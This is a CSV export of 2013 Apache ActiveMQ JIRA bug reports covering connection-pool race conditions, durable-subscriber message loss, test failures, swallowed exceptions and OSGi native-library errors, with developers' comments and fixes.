2013,,,,,,,,,,,"0|i1jiwn:",322158,,,,,,,,,,,,,,,,,,,,,"08/Apr/13 17:00;dejanb;Fixed with svn revision 1465683;;;","08/Apr/13 17:02;dejanb;Note that you should use backupPoolSize to match number of brokers - 1 for this to work. For 3 brokers, an example can be

{code}failover:(tcp://localhost:61616,tcp://localhost:62616,tcp://localhost:63616)?randomize=false&priorityBackup=true&backupPoolSize=2{code}

;;;","28/May/13 11:21;dejanb;Svn revision 1486869 added an additional improvement where priority backup will not be restricted by the backup pool size. If priority backup is available, the client will reconnect to it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in PooledConnectionFactory.createConnection,AMQ-4441,12640951,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,andrei.sobchuck,andrei.sobchuck,05/Apr/13 07:15,08/Apr/13 18:58,14/Jul/23 05:43,08/Apr/13 18:58,5.8.0,,,,,5.9.0,,,Pool,,,,0,,,,,,,,,"`PooledConnectionFactory.createConnection(String userName, String password)` can return broken Connection. By `broken` I mean PooledConnection with referenceCount==1, but without underlying ActiveMQConnection.
The problem is in lines 
{code}
connection = connectionsPool.borrowObject(key);
...
return new PooledConnection(connection);
{code}
While method `borrowObject` validates the connection and `new PooledConnection` increments referenceCount, it's possible that some thread calls `ConnectionPool.decrementReferenceCount()` just between `borrowObject` and `new PooledConnection`. referenceCount at this stage can be a zero and the ConnectionPool became closed just prior to `new PooledConnection`.
",,andrei.sobchuck,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Apr/13 07:30;andrei.sobchuck;AMQ_4441.java;https://issues.apache.org/jira/secure/attachment/12577496/AMQ_4441.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321410,,,Mon Apr 08 18:58:40 UTC 2013,,,,,,,,,,,"0|i1jgf3:",321755,,,,,,,,,,,,,,,,,,,,,"05/Apr/13 13:47;tabish;Recommend you try and create a test case so this can be validated.;;;","08/Apr/13 07:30;andrei.sobchuck;Try attached AMQ_4441. It's not stable (due to nature of the issue) and it can take long time to crash.;;;","08/Apr/13 18:58;tabish;Fixed on trunk, will update in the next nightly.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JUnit deprecation warnings,AMQ-4437,12640769,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,lionel.cons,lionel.cons,04/Apr/13 13:53,04/Apr/13 15:00,14/Jul/23 05:43,04/Apr/13 15:00,,,,,,,,,,,,,0,,,,,,,,,"When compiling the ActiveMQ trunk using Java 7, I get:

{quote}
[WARNING] ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:[31,22] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:[133,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:[192,20] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:[30,22] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:[19,22] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:[73,3] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:[84,3] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:[98,2] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:[216,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:[251,20] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:[112,8] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:[115,8] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:[37,22] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQFailoverIssue.java:[95,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:[114,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:[165,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:[217,12] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-unit-tests/src/test/java/org/apache/activemq/network/NetworkLoopBackTest.java:[26,29] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-fileserver/src/test/java/org/apache/activemq/util/HttpBlobTest.java:[57,8] [deprecation] Assert in junit.framework has been deprecated
[WARNING] ~activemq/activemq-fileserver/src/test/java/org/apache/activemq/util/HttpBlobTest.java:[68,8] [deprecation] Assert in junit.framework has been deprecated
{quote}

This is probably something worth fixing...",,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321228,,,Thu Apr 04 15:00:50 UTC 2013,,,,,,,,,,,"0|i1jfb3:",321573,,,,,,,,,,,,,,,,,,,,,"04/Apr/13 15:00;tabish;Fixed the warnings. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ActiveMQConnectionFatory should populate ""consumerFailoverRedeliveryWaitPeriod""",AMQ-4435,12640745,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,dguggi,dguggi,04/Apr/13 10:55,04/Apr/13 14:33,14/Jul/23 05:43,04/Apr/13 14:33,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"ActiveMQConnectionFactory contains ""consumerFailoverRedeliveryWaitPeriod"" to be applied to the connection created - however method ""populateProperties()"" ignores this property.

The following should be added to populateProperties() method

{code}
props.setProperty(""consumerFailoverRedeliveryWaitPeriod"", Long.toString(consumerFailoverRedeliveryWaitPeriod));
{code}",,dguggi,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321204,,,2013-04-04 10:55:26.0,,,,,,,,,,,"0|i1jf5r:",321549,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AcitveMQ stop responding when OS running out of free disk space,AMQ-4434,12640630,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,andriykalashnykov,andriykalashnykov,03/Apr/13 21:41,22/Jan/16 21:40,14/Jul/23 05:43,22/Jan/16 21:40,5.8.0,,,,,,,,Broker,,,,0,,,,,,,,,"AcitveMQ stop responding when OS running out of free disk space.
Steps to reproduce: run ActiveMQ with almost no disk space left, use hdd to the point that there is no more left. 

This behavior directly affect HA: in my case, i have four instances of ActiveMQ on different physical servers and ActiveMQ configured to share Oracle DB. First server became master worked for a while and went down, then second server (the one with little disk space left) became a master and worked for a while, than it became unresponsive and all AcitveMQ cluster was unaccessible. 
I belive it's due the fact that on the box with little space ActiveMQ was still running and perhaps preventing DB connection to be release for other servers to use.  

Suggestion: check disk space on start and periodically after start, once disk space is low on none left - gracefully exit.

Regards.",RHEL 6.4 x64 bit,andriykalashnykov,davsclaus,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321089,,,Fri Jan 22 21:40:56 UTC 2016,,,,,,,,,,,"0|i1jeg7:",321434,,,,,,,,,,,,,,,,,,,,,"30/Oct/13 10:35;davsclaus;There is some disk space left check in AMQ 5.9 on startup. You get a WARN logging if the broker does not have as much free space as configured to allow to use.;;;","22/Jan/16 21:40;tabish;There has been several enhancements to disk space checks on startup as well as periodic checks to contract or expand the configured limits based on available space.  Recommend a retest using the most recent release.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Validate camel context within activemq.xml in karaf,AMQ-4432,12640485,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,03/Apr/13 10:34,03/Apr/13 11:30,14/Jul/23 05:43,03/Apr/13 11:30,5.8.0,,,,,5.9.0,,,,,,,0,activemq,camel,karaf,osgi,xbean,xml,,,"Validate use case in xml config as follows: {code}
<beans>
    <broker xmlns=""http://activemq.apache.org/schema/core""
            brokerName=""${broker-name}""
            dataDirectory=""${data}""
            start=""false"" />
    ...
    <camelContext id=""camel"" xmlns=""http://camel.apache.org/schema/spring"">
        <route id=""queueToDbTransacted"">
            <from uri=""activemq:queue:camel_in""/>
            <to uri=""activemq:queue:camel_out""/>
        </route>
    </camelContext>
</beans>
",,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,320945,,,Wed Apr 03 11:30:50 UTC 2013,,,,,,,,,,,"0|i1jdjb:",321286,,,,,,,,,,,,,,,,,,,,,"03/Apr/13 11:30;gtully;fix nd test in http://svn.apache.org/r1463909;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Don't swallow errors in IntrospectionSupport.setProperty,AMQ-4428,12640319,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,qerub,qerub,02/Apr/13 14:57,07/Dec/18 12:51,14/Jul/23 05:43,07/May/13 10:53,,,,,,5.9.0,,,,,,,0,,,,,,,,,"`setProperty` currently ends with `… catch (Throwable ignore) \{ return false; \}`. This can make troubleshooting invalid configuration much harder since the exception (that contains detailed information) is hidden from the user.",,ebudan,gtully,qerub,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-7121,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,320782,,,Tue May 07 10:53:35 UTC 2013,,,,,,,Patch Available,,,,"0|i1jcj3:",321123,,,,,,,,,,,,,,,,,,,,,"03/Apr/13 21:12;gtully;I recall there are a few places where url params are applied to a bunch of components in a chain, the ones that match are removed and there is an assertion that all are consumed. So in that case, some are expected to be invalid. In that case, using info in place of error may be better.

A sanity check woud be to run the unit tests in activemq-unit-tests module (mvn test) and peek at the resulting target/activemq-test.log to see how often the error shows up.;;;","04/Apr/13 10:23;qerub;(I've found that a couple of those assertions are missing, but I've filed another issue for that (AMQ-4433). I believe there is a problem even assuming all assertions are in place.)

In the context of setProperty, properties/parameters can be invalid in two ways:

1. The property is missing on the target object. This situation happens a lot during normal initialization and works fine as is.

2. The property does exist but calling the setter throws an exception. This is the situation I believe is exceptional and should be logged. With working assertions the property/parameter will be flagged as invalid, but the exception—which contains information about why the property value is invalid—is hidden from the user, making troubleshooting harder.

For reference: https://github.com/apache/activemq/blob/trunk/activemq-client/src/main/java/org/apache/activemq/util/IntrospectionSupport.java#L160

I'll do some more research with the unit tests and get back to you.

Thanks for your time!;;;","06/May/13 11:03;ebudan;An example of where this swallowed Throwable produced considerable headache.

An embedded Broker's timeout options were not being set as expected. The first suspect was documentation wiki/code mismatch (FailoverTransport backoffMultiplier vs. reconnectDelayExponent), but this wasn't the real culprit: IntrospectionSupport has a static init of a third-party library, which had been missed by us while minimizing libraries for the embed. The IntrospectionSupport.setProperty() catch silently swallows the informative exception.

I would second #2, above. 
Further, I would suggest catching qualified exceptions rather than Throwable, which risks silencing possible fatal errors (OOM). 

;;;","06/May/13 20:18;qerub;> Further, I would suggest catching qualified exceptions rather than Throwable [...]

I agree. Here's a {{s/Throwable/Exception/}} patch:
https://github.com/qerub/activemq/commit/0e09f1649a4cecb38476262a61f51acf578f64e3.patch

And here's an updated version of the original patch:
https://github.com/qerub/activemq/commit/2442b3311e7f069b93a619dd3a8821571d1d67b6.patch

(Remove .patch from URL for a prettier view.)

I have run the full ActiveMQ test suite with these changes and they generate no spurious log messages.;;;","07/May/13 10:53;gtully;patch applied with thanks in http://svn.apache.org/r1479852;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Many of the activemq-http tests are failing on Jenkins,AMQ-4427,12640315,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kearls,kearls,02/Apr/13 14:41,02/Apr/13 14:49,14/Jul/23 05:43,02/Apr/13 14:49,,,,,,,,,Test Cases,,,,0,,,,,,,,,"260 out of 454 failed on the last run, mostl with ""java.net.BindException: Address already in use""
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Apr/13 14:43;kearls;AMQ-4427.patch;https://issues.apache.org/jira/secure/attachment/12576584/AMQ-4427.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,320778,,,Tue Apr 02 14:49:17 UTC 2013,,,,,,,Patch Available,,,,"0|i1jci7:",321119,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"02/Apr/13 14:43;kearls;Updated pom.xml to use forkMode always.;;;","02/Apr/13 14:49;tabish;patch applied.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"AMQ2584Test, AMQ2870Test, and several others hang or fail on some platforms when using LevelDB",AMQ-4415,12639641,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kearls,kearls,28/Mar/13 18:15,28/Mar/13 18:43,14/Jul/23 05:43,28/Mar/13 18:43,,,,,,,,,Test Cases,,,,0,,,,,,,,,"Problem tests include:

AMQ2584Test 
AMQ2870Test  
QueueMbeanRestartTest 
FailoverTransactionTest
ConcurrentProducerDurableConsumerTest
DurableSubscriptionOfflineTest

The patch adds timeouts, and for the AMQ2584Test and AMQ2870Test does not run the LevelDB instance of the test, as these fail in tearDown, so timeouts do not prevent the tests from hanging.

Note:  Where possible I've changed these from using CombinationTestSupport to JUnit4 Parameterized tests with timeouts defined.  It looks like sometimes if a test which extends CombinationTestSupport turns on AutoFail and a timeout occurs, Maven reports the following:

Results :

Tests run: 0, Failures: 0, Errors: 0, Skipped: 0

",AIX and Solaris,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Mar/13 18:17;kearls;AMQ-4415.patch;https://issues.apache.org/jira/secure/attachment/12575906/AMQ-4415.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,320110,,,Thu Mar 28 18:43:24 UTC 2013,,,,,,,Patch Available,,,,"0|i1j8dr:",320451,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"28/Mar/13 18:25;tabish;Do we have corresponding issues someplace to track the issues with the tests where you've disabled LevelDB testing, we'd need to remember to get back to those when time permits. ;;;","28/Mar/13 18:32;kearls;Did you open a general one to keep track of those?  If not I'll open one.;;;","28/Mar/13 18:43;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persistent message loss when JMS durable subscriber reconnects regardless of message store impl.,AMQ-4413,12639492,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,choijw1,choijw1,28/Mar/13 00:04,30/May/13 09:16,14/Jul/23 05:43,15/May/13 22:23,5.7.0,5.8.0,,,,5.9.0,,,Broker,JMS client,Message Store,,0,,,,,,,,,"Persistent message is lost intermittently when JMS durable topic subscriber reconnects to the broker service.  From the log observation, it seems that the internal states of the store cursor (i.e. AbstractStoreCursor) is not well guarded by race condition between message sending/directly-dispatching-pending thread (from publisher) and subscription deactivating thread (from subscriber's closing), especially when subscriber's closing (javax.jms.MessageConsumer#close) and message publishing happen simultaneously.

Observations and the test scenario are described at below in detail:
http://activemq.2283324.n4.nabble.com/persistent-message-missing-to-a-durable-subscriber-when-it-reconnects-restarts-td4665130.html

Attached please find Test.java that I used to verify this issue.  I found the issue initially with activemq-core-5.7.0.jar then confirmed that it's reproducible with other upper versions (i.e. apache-activemq-5.8-SNAPSHOT, apache-activemq-5.9-SNAPSHOT).

This ""message loss"" issue is pretty critical as it can happen whenever durable subscriber reconnects either purposely or unexpectedly, and it could be violating the one of primitive features that messaging platform guarantees: ""no message loss"",  if happens, whereas it's so easy to reproduce the trouble.",,ceposta,choijw1,gtully,tabish,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Mar/13 13:30;ceposta;AMQ4413-testcase.patch;https://issues.apache.org/jira/secure/attachment/12576065/AMQ4413-testcase.patch","14/May/13 16:25;tabish;AMQ4413Test.java;https://issues.apache.org/jira/secure/attachment/12583149/AMQ4413Test.java","09/May/13 22:18;tabish;AMQ4413Test.java;https://issues.apache.org/jira/secure/attachment/12582529/AMQ4413Test.java","28/Mar/13 00:09;choijw1;Test.java;https://issues.apache.org/jira/secure/attachment/12575802/Test.java",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319961,,,Thu May 30 09:16:10 UTC 2013,,,,,,,,,,,"0|i1j7gn:",320302,,,,,,,,,,,,,,,,,,,,,"28/Mar/13 00:09;choijw1;Compilation only requires activemq-core-5.7.0.jar or any corresponding dependency of upper versions (e.g. activemq-all-5.9-20130327.044852-30.jar from apache-activemq-5.9-SNAPSHOT.zip).;;;","29/Mar/13 13:30;ceposta;Won't have time to get into this one right now, but updated the test case to be a unit test and ran it to make sure it failed (and it does). ;;;","09/May/13 21:07;tabish;In the supplied test case the message loss is expect since persistence is not enabled and the option to keep durable subs active is not enabled.  If you enable keepDurableSubsActive it would work as expected.  What's the real configuration you use when you encounter this problem.  ;;;","09/May/13 21:53;choijw1;keepDurableSubsActive is enabled by default and it didn't changed in the test case.  Where/how do you see it's disabled?  Anyway, you'll see it won't help even with an explicit enablement of that option with the following line of code:

brokerService.setKeepDurableSubsActive(true);;;;","09/May/13 22:00;tabish;You're right my bad, so many broker options to remember.  ;;;","09/May/13 22:18;tabish;Further refined the test case so it actually fails if the expectations aren't met.  Also removed hard coded port 61616;;;","14/May/13 16:25;tabish;Updated test to make message seq numbers make the MessageId sequence for easier debug.  Turned off advisory messages to make logs less verbose.;;;","14/May/13 16:25;tabish;I think you can work around this by setting a lower prefetch limit, seems to be related and test passes always for me with a value of one. ;;;","14/May/13 21:56;tabish;Have you ever reproduced this with persistence enabled using this test case?;;;","15/May/13 20:34;choijw1;>> Have you ever reproduced this with persistence enabled using this test case?
Yes. I observed the bug with persistence enabled first, then tried & reproduced with persistence disabled (which uses memory-based persistent adapter) which means the trouble is unrelated to any specific message store implementation.;;;","15/May/13 20:39;tabish;If you can provide a test that reproduces with a store it would be more useful.;;;","15/May/13 20:51;choijw1;Unfortunately it's not possible because the persistence adapter/store I tested with is a custom one outside the AMQ code base. FYI, it's Apache BookKeeper-based and can't be shared outside my company, yet.  The reason I tested with persistence option disabled is because of this reason: I needed to verify it's persistence-store independent problem.;;;","15/May/13 21:18;tabish;Ok.  I know why its happening and we are trying out a fix.  Have to ensure we don't break any other use cases though. ;;;","15/May/13 22:23;tabish;Fixed on trunk, to workaround the issue you can set keepDurableSubsActive to false and you shouldn't see this.  ;;;","15/May/13 23:16;choijw1;Thanks for the fix.  Any impact to the persistence message consumption of durable subscribers by turning keepDurableSubsActive option off?;;;","16/May/13 10:19;gtully;@Jaewoong - a reconnect does a little bit more work when keepDurableSubsActive=false but durability of messages is not effected. The messages were not actually lost, they were not dispatched. ;;;","30/May/13 09:16;wangyin;Can anyone ensure whether the issue also affects 5.5.0?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-osgi <Bundle-NativeCode> directive is too strict - needs to be optional,AMQ-4411,12639330,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,27/Mar/13 14:29,24/Jul/13 15:13,14/Jul/23 05:43,27/Mar/13 14:33,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When the bundle is used on a platform where we don't have native libs we fail with:{code}
2013-03-27 14:19:47,241 | ERROR | Thread-6         | FeaturesServiceImpl              | s.internal.FeaturesServiceImpl$2 1143 | 20 - org.apache.karaf.features.core - 2.3.0 | Error installing boot features
java.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-osgi/5.9-SNAPSHOT in feature(s) activemq-client-5.9-SNAPSHOT: Unresolved constraint in bundle org.apache.activemq.activemq-osgi [87]: No matching native libraries found.
        at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:476)[20:org.apache.karaf.features.core:2.3.0]
        at org.apache.karaf.features.internal.FeaturesServiceImpl$2.run(FeaturesServiceImpl.java:1141)[20:org.apache.karaf.features.core:2.3.0]
Caused by: org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.activemq.activemq-osgi [87]: No matching native libraries found.
        at org.apache.felix.framework.Felix.resolveBundleRevision(Felix.java:3826)[org.apache.felix.framework-4.0.3.jar:]
        at org.apache.felix.framework.Felix.startBundle(Felix.java:1868)[org.apache.felix.framework-4.0.3.jar:]
        at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:944)[org.apache.felix.framework-4.0.3.jar:]
        at org.apache.felix.framework.BundleImpl.start(BundleImpl.java:931)[org.apache.felix.framework-4.0.3.jar:]
        at org.apache.karaf.features.internal.FeaturesServiceImpl.installFeatures(FeaturesServiceImpl.java:473)[20:org.apache.karaf.features.core:2.3.0]
        ... 1 more
{code}

Adding a '*' clause to <Bundle-NativeCode> sorts this. levelDB will fallback to the java impl in cases where the jni deps are not found. But also, it allows the bundle to used with the default store where there are no native deps at all.",,crocodileshoes,fredle,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319800,,,Wed Jul 24 15:13:05 UTC 2013,,,,,,,,,,,"0|i1j6gv:",320141,,,,,,,,,,,,,,,,,,,,,"27/Mar/13 14:33;gtully;fix in http://svn.apache.org/r1461608;;;","28/Mar/13 21:09;crocodileshoes;Just for a heads up, I think this still occurs in karaf 3.0.0.

I tried installing the 5.9-SNAPSHOT in karaf 3 and get the ""No matching native libraries found."" error. I checked out activemq to double check and the wildcard * is present in the nativecode section.

It's probably worth noting that the karaf 3 instance is created by the karaf tooling plugin so perhaps something something is missing there.;;;","24/Jul/13 15:13;fredle;Can anyone suggest a solution so that I can get around this temporarily without building activemq? running in Karaf 2.3.1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
